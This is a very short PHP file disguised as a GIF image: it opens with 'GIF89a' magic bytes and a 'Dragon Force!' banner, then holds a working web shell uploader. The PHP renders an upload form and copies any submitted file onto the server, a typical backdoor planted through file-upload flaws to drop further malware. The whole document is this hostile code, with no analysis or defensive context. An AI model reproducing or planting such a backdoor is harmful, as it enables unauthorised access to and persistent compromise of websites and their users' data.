GIF89a;Success :;Dragon Force!;
<?php if($_POST){if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){echo"Y";}else{echo"N";}}else{echo"<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=up>";}?>
